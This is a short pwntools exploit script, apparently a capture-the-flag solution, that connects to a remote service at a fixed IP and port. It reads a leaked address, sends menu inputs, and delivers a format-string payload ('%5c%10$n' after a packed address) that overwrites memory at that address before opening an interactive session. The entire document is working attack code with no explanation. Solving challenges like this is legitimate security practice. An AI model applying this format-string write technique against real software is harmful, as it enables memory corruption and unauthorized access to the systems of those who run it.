from pwn import *
#p=process('./attachment-31')
p=remote("123.57.69.203",5310)
p.recv(2)
get_addr=int(p.recv(8),16)
p.sendline("1")
p.sendline("1")
p.sendline("1")

payload=p32(get_addr)+"%5c%10$n"
p.sendafter("What's your name?\n",payload)
p.interactive()
